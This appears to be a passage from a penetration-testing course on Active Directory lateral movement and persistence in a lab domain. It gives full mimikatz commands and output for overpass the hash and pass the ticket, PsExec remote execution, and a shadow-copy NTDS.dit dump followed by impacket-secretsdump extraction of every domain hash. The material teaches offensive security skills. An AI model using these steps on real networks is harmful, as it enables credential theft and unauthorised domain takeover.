## 24.1.4. Overpass the hash

With [_overpass the hash_](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf), we can "over" abuse an NTLM user hash to gain a full Kerberos [_Ticket Granting Ticket_](https://learn.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-tickets) (TGT). Then we can use the TGT to obtain a [_Ticket Granting Service_](https://learn.microsoft.com/en-us/windows/win32/secauthn/ticket-granting-service-exchange) (TGS).

To demonstrate this, let's assume we have compromised a workstation (or server) that _jen_ has authenticated to. We'll also assume that the machine is now caching their credentials (and therefore, their NTLM password hash).

To simulate this cached credential, we will log in to the Windows 10 CLIENT76 machine as _jeff_ and run a process as _jen_, which prompts authentication.

The simplest way to do this is to right-click the Notepad icon on the desktop then shift left-click "show more options" on the popup, yielding the options in Figure 2.

![Figure 2: Enabling extra options](https://static.offsec.com/offsec-courses/PEN-200/imgs/ad_lat_movement/e3aac4ec66c2a9b0a07b7160c9a3ffae-runas1.png)

Figure 2: Enabling extra options

From here, we enter _jen_ as the username along with the associated password, which will launch Notepad in the context of that user. After successful authentication, _jen_'s credentials will be cached on this machine.

We can validate this by opening an Administrative shell and using **mimikatz** with the **sekurlsa::logonpasswords** command. The command will dump the cached password hashes.

```
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::logonpasswords

...
Authentication Id : 0 ; 1142030 (00000000:00116d0e)
Session           : Interactive from 0
User Name         : jen
Domain            : CORP
Logon Server      : DC1
Logon Time        : 2/27/2023 7:43:20 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1124
        msv :
         [00000003] Primary
         * Username : jen
         * Domain   : CORP
         * NTLM     : 369def79d8372408bf6e93364cc93075
         * SHA1     : faf35992ad0df4fc418af543e5f4cb08210830d4
         * DPAPI    : ed6686fedb60840cd49b5286a7c08fa4
        tspkg :
        wdigest :
         * Username : jen
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : jen
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
...
```

> Listing 17 - Dumping password hash for 'jen'

This output shows _jen_'s cached credentials under _jen_'s own session. It includes the NTLM hash, which we will leverage to overpass the hash.

The essence of the overpass the hash lateral movement technique is to turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication. A simple way to do this is with the **sekurlsa::pth** command from Mimikatz.

The command requires a few arguments and creates a new PowerShell process in the context of _jen_. This new PowerShell prompt will allow us to obtain Kerberos tickets without performing NTLM authentication over the network, making this attack different than a traditional pass-the-hash.

As the first argument, we specify **/user:** and **/domain:**, setting them to **jen** and **corp.com** respectively. We'll specify the NTLM hash with **/ntlm:** and finally, use **/run:** to specify the process to create (in this case, PowerShell).

```
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell 
user    : jen
domain  : corp.com
program : powershell
impers. : no
NTLM    : 369def79d8372408bf6e93364cc93075
  |  PID  8716
  |  TID  8348
  |  LSA Process is now R/W
  |  LUID 0 ; 16534348 (00000000:00fc4b4c)
  \_ msv1_0   - data copy @ 000001F3D5C69330 : OK !
  \_ kerberos - data copy @ 000001F3D5D366C8
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 000001F3D5C63B68 (32) -> null
```

> Listing 18 - Creating a process with a different user's NTLM password hash

At this point, we have a new PowerShell session that allows us to execute commands as _jen_.

At this point, running the _whoami_ command on the newly created PowerShell session would show _jeff_'s identity instead of _jen_. While this could be confusing, this is the intended behavior of the _whoami_ utility which only checks the current process's token and does not inspect any imported Kerberos tickets

Let's list the cached Kerberos tickets with **klist**.

```
PS C:\Windows\system32> klist

Current LogonId is 0:0x1583ae

Cached Tickets: (0)
```

> Listing 19 - Listing Kerberos tickets

No Kerberos tickets have been cached, but this is expected since _jen_ has not yet performed an interactive login. Let's generate a TGT by authenticating to a network share on the files04 server with **net use**.

```
PS C:\Windows\system32> net use \\files04
The command completed successfully.
```

> Listing 20 - Mapping a network share on a remote server

The output indicates that the **net use** command was successful.

Now let's use the **klist** command to list the newly requested Kerberos tickets.

```
PS C:\Windows\system32> klist

Current LogonId is 0:0x17239e

Cached Tickets: (2)

#0>     Client: jen @ CORP.COM
        Server: krbtgt/CORP.COM @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/27/2023 5:27:28 (local)
        End Time:   2/27/2023 15:27:28 (local)
        Renew Time: 3/6/2023 5:27:28 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: DC1.corp.com

#1>     Client: jen @ CORP.COM
        Server: cifs/files04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 2/27/2023 5:27:28 (local)
        End Time:   2/27/2023 15:27:28 (local)
        Renew Time: 3/6/2023 5:27:28 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: DC1.corp.com
```

> Listing 21 - Listing Kerberos tickets

The output has the Kerberos tickets, including the TGT and a TGS for the _Common Internet File System_ (CIFS) service.

We know that ticket #0 is a TGT because the server is krbtgt.

We used net use arbitrarily in this example, but we could have used any command that requires domain permissions and would subsequently create a TGS.

We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication (as opposed to NTLM). Here we will use the official [_PsExec application_](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) from Microsoft.

PsExec can run a command remotely but does not accept password hashes. Since we have generated Kerberos tickets and operate in the context of _jen_ in the PowerShell session, we can reuse the TGT to obtain code execution on the files04 host.

Let's try that now, running **.\PsExec.exe** to launch **cmd** remotely on the files04 machine as _jen_.

```
PS C:\Windows\system32> cd C:\tools\SysinternalsSuite\
PS C:\tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
corp\jen

C:\Windows\system32>hostname
FILES04
```

> Listing 22- Opening remote connection using Kerberos

As evidenced by the output, we have successfully reused the Kerberos TGT to launch a command shell on the files04 server.

Excellent! We have successfully upgraded a cached NTLM password hash to a Kerberos TGT to gain remote code execution on behalf of another user.

## 24.1.5. Pass the ticket

In the previous section, we used the overpass-the-hash technique (along with the captured NTLM hash) to acquire a Kerberos TGT, allowing us to authenticate using Kerberos. A TGT is not bound to a specific host and can typically be reused on other systems within its lifetime (usually around 10 hours), enabling us to request service tickets (TGS) for multiple services. In contrast, a TGS is issued for a specific service principal (SPN) and is only valid for that particular service, which means it cannot be reused across different systems or services.

The _Pass the Ticket_ attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.

In this scenario, we are going to abuse an already existing session of the user _dave_. The _dave_ user has privileged access to the _backup_ folder located on WEB04 whereas our logged-in user _jen_ does not.

To demonstrate the attack angle, we are going to extract all the current TGT/TGS in memory and inject _dave_'s WEB04 TGS into our own session. This will allow us to access the restricted folder.

Let's first log in as _jen_ to CLIENT76 and verify that we are unable to access the resource on WEB04. To do so, we'll try to list the content of the \\web04\backup folder from an administrative PowerShell command line session.

```
PS C:\Windows\system32> whoami
corp\jen
PS C:\Windows\system32> ls \\web04\backup
ls : Access to the path '\\web04\backup' is denied.
At line:1 char:1
+ ls \\web04\backup
+ ~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\web04\backup:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

> Listing 23 - Verifying that the user jen has no access to the shared folder

Confirming that _jen_ has no access to the restricted folder, we can now launch mimikatz, enable debug privileges, and export all the TGT/TGS from memory with the **sekurlsa::tickets /export** command.

```
mimikatz #privilege::debug
Privilege '20' OK

mimikatz #sekurlsa::tickets /export

Authentication Id : 0 ; 2037286 (00000000:001f1626)
Session           : Batch from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/14/2022 6:24:17 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103

         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 9/14/2022 6:24:17 AM ; 9/14/2022 4:24:17 PM ; 9/21/2022 6:24:17 AM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP ; @ CORP.COM
           Client Name  (01) : dave ; @ CORP.COM ( CORP )
           Flags 40c10000    : name_canonicalize ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             f0259e075fa30e8476836936647cdabc719fe245ba29d4b60528f04196745fe6
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;1f1626]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi !
...
```

> Listing 24 - Exporting Kerberos TGT/TGS to disk

The above command parsed the [_LSASS_](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) process space in memory for any TGT/TGS, which is then saved to disk in the kirbi mimikatz format.

Inspecting the generated tickets indicates that _dave_ had initiated a session. We can try to inject one of their tickets inside _jen_'s sessions.

We can verify newly generated tickets with **dir**, filtering out on the **kirbi** extension.

```
PS C:\Tools> dir *.kirbi


    Directory: C:\Tools


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/14/2022   6:24 AM           1561 [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;12bd0]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1c6860]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1c6860]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1c7bcc]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1c7bcc]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1c933d]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1c933d]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
-a----        9/14/2022   6:24 AM           1561 [0;1ca6c2]-0-0-40810000-dave@cifs-web04.kirbi
-a----        9/14/2022   6:24 AM           1505 [0;1ca6c2]-2-0-40c10000-dave@krbtgt-CORP.COM.kirbi
...
```

> Listing 25 - Exporting Kerberos TGT/TGS to disk

As many tickets have been generated, we can just pick any TGS ticket in the **dave@cifs-web04.kirbi** format and inject it through mimikatz via the **kerberos::ptt** command.

```
mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

* File: '[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi': OK
```

> Listing 26 - Injecting the selected TGS into process memory.

No errors have been thrown, meaning that we should expect the ticket in our session when running **klist**.

```
PS C:\Tools> klist

Current LogonId is 0:0x13bca7

Cached Tickets: (1)

#0>     Client: dave @ CORP.COM
        Server: cifs/web04 @ CORP.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40810000 -> forwardable renewable name_canonicalize
        Start Time: 9/14/2022 5:31:32 (local)
        End Time:   9/14/2022 15:31:13 (local)
        Renew Time: 9/21/2022 5:31:13 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

> Listing 27 - Inspecting the injected ticket in memory

We notice that the _dave_ ticket has been successfully imported in our own session for the _jen_ user.

Let's confirm we have been granted access to the restricted shared folder.

```
PS C:\Tools> ls \\web04\backup


    Directory: \\web04\backup


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/13/2022   2:52 AM              0 backup_schemata.txt
```

> Listing 28 - Accessing the shared folder through the injected ticket

Awesome! We managed to successfully access the folder by impersonating _dave_'s identity after injecting its authentication token into our user's process.

## 24.2.2. Shadow copies

A [_Shadow Copy_](https://en.wikipedia.org/wiki/Shadow_Copy), also known as _Volume Shadow Service_ (VSS) is a Microsoft backup technology that allows the creation of snapshots of files or entire volumes.

To manage volume shadow copies, the Microsoft signed binary [_vshadow.exe_](https://learn.microsoft.com/en-us/windows/win32/vss/vshadow-tool-and-sample) is offered as part of the [Windows SDK](https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/).

As domain admins, we can abuse the vshadow utility to create a Shadow Copy that will allow us to extract the Active Directory Database [**NTDS.dit**](https://technet.microsoft.com/en-us/library/cc961761.aspx) database file. Once we've obtained a copy of the database, we need the SYSTEM hive, and then we can extract every user credential offline on our local Kali machine.

To start, we'll connect as the _jeffadmin_ domain admin user to the DC1 domain controller. Here we will launch an elevated command prompt and run the **vshadow** utility with **-nw** options to [_disable writers_](https://learn.microsoft.com/en-us/windows/win32/vss/shadow-copy-creation-details), which speeds up backup creation and include the **-p** option to store the copy on disk.

```
C:\Tools>vshadow.exe -nw -p  C:

VSHADOW.EXE 3.0 - Volume Shadow Copy sample client.
Copyright (C) 2005 Microsoft Corporation. All rights reserved.


(Option: No-writers option detected)
(Option: Create shadow copy set)
- Setting the VSS context to: 0x00000010
Creating shadow set {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5} ...
- Adding volume \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\] to the shadow set...
Creating the shadow (DoSnapshotSet) ...
(Waiting for the asynchronous operation to finish...)
Shadow copy set successfully created.

List of created shadow copies:


Querying all shadow copies with the SnapshotSetID {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5} ...

* SNAPSHOT ID = {c37217ab-e1c4-4245-9dfe-c81078180ae5} ...
   - Shadow copy Set: {f7f6d8dd-a555-477b-8be6-c9bd2eafb0c5}
   - Original count of shadow copies = 1
   - Original Volume name: \\?\Volume{bac86217-0fb1-4a10-8520-482676e08191}\ [C:\]
   - Creation Time: 9/19/2022 4:31:51 AM
   - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
   - Originating machine: DC1.corp.com
   - Service machine: DC1.corp.com
   - Not Exposed
   - Provider id: {b5946137-7b9f-4925-af80-51abd60b20d5}
   - Attributes:  Auto_Release No_Writers Differential


Snapshot creation done.
```

> Listing 41 - Performing a Shadow Copy of the entire C: drive

Once the snapshot has been taken successfully, we should take note of the shadow copy device name.

We'll now copy the whole AD Database from the shadow copy to the **C:** drive root folder by specifying the _shadow copy device name_ and adding the full **ntds.dit** path.

```
C:\Tools>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
   1 file(s) copied.
```

> Listing 42 - Copying the ntds database to the C: drive

As a last ingredient, to correctly extract the content of **ntds.dit**, we need to save the SYSTEM hive from the Windows registry. We can accomplish this with the **reg** utility and the **save** argument.

```
C:\>reg.exe save hklm\system c:\system.bak
The operation completed successfully.
```

> Listing 43 - Copying the ntds database to the C: drive

Once the two **.bak** files are moved to our Kali machine, we can continue extracting the credential materials with the _secretsdump_ tool from the impacket suite. We'll supply the ntds database with the **-ntds** parameter and the system hive with the **-system** parameter. Then we will tell impact to parse the files locally by adding the **LOCAL** keyword.

```
kali@kali:~$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0xbbe6040ef887565e9adb216561dc0620
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 98d2b28135d3e0d113c4fa9d965ac533
[*] Reading and decrypting hashes from ntds.dit.bak
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC1$:1000:aad3b435b51404eeaad3b435b51404ee:eda4af1186051537c77fa4f53ce2fe1a:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
stephanie:1104:aad3b435b51404eeaad3b435b51404ee:d2b35e8ac9d8f4ad5200acc4e0fd44fa:::
jeff:1105:aad3b435b51404eeaad3b435b51404ee:2688c6d2af5e9c7ddb268899123744ea:::
jeffadmin:1106:aad3b435b51404eeaad3b435b51404ee:e460605a9dbd55097c6cf77af2f89a03:::
iis_service:1109:aad3b435b51404eeaad3b435b51404ee:4d28cf5252d39971419580a51484ca09:::
WEB04$:1112:aad3b435b51404eeaad3b435b51404ee:87db4a6147afa7bdb46d1ab2478ffe9e:::
FILES04$:1118:aad3b435b51404eeaad3b435b51404ee:d75ffc4baaeb9ed40f7aa12d1f57f6f4:::
CLIENT74$:1121:aad3b435b51404eeaad3b435b51404ee:5eca857673356d26a98e2466a0fb1c65:::
CLIENT75$:1122:aad3b435b51404eeaad3b435b51404ee:b57715dcb5b529f212a9a4effd03aaf6:::
pete:1123:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
jen:1124:aad3b435b51404eeaad3b435b51404ee:369def79d8372408bf6e93364cc93075:::
CLIENT76$:1129:aad3b435b51404eeaad3b435b51404ee:6f93b1d8bbbe2da617be00961f90349e:::
[*] Kerberos keys from ntds.dit.bak
Administrator:aes256-cts-hmac-sha1-96:56136fd5bbd512b3670c581ff98144a553888909a7bf8f0fd4c424b0d42b0cdc
Administrator:aes128-cts-hmac-sha1-96:3d58eb136242c11643baf4ec85970250
Administrator:des-cbc-md5:fd79dc380ee989a4
DC1$:aes256-cts-hmac-sha1-96:fb2255e5983e493caaba2e5693c67ceec600681392e289594b121dab919cef2c
DC1$:aes128-cts-hmac-sha1-96:68cf0d124b65310dd65c100a12ecf871
DC1$:des-cbc-md5:f7f804ce43264a43
krbtgt:aes256-cts-hmac-sha1-96:e1cced9c6ef723837ff55e373d971633afb8af8871059f3451ce4bccfcca3d4c
krbtgt:aes128-cts-hmac-sha1-96:8c5cf3a1c6998fa43955fa096c336a69
krbtgt:des-cbc-md5:683bdcba9e7c5de9
...
[*] Cleaning up...
```

> Listing 44 - Copying the ntds database to the C: drive

Great! We managed to obtain NTLM hashes and Kerberos keys for every AD user. We can now try to crack them or use as-is in pass-the-hash attacks.

While these methods might work fine, they leave an access trail and may require us to upload tools. An alternative is to abuse AD functionality itself to capture hashes remotely from a workstation.

To do this, we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user, using the DC sync method described in the previous Module. This is a less conspicuous persistence technique that we can misuse.

Although most penetration tests wouldn't require us to be covert, we should always evaluate a given technique's stealthiness, which could be useful during future red-teaming engagements.

In this Learning Unit, we explored a few Windows Active Directory persistence techniques that could be employed during penetration testing or red-teaming exercises whose rules of engagement mandate we retain long-term access to the compromised environment.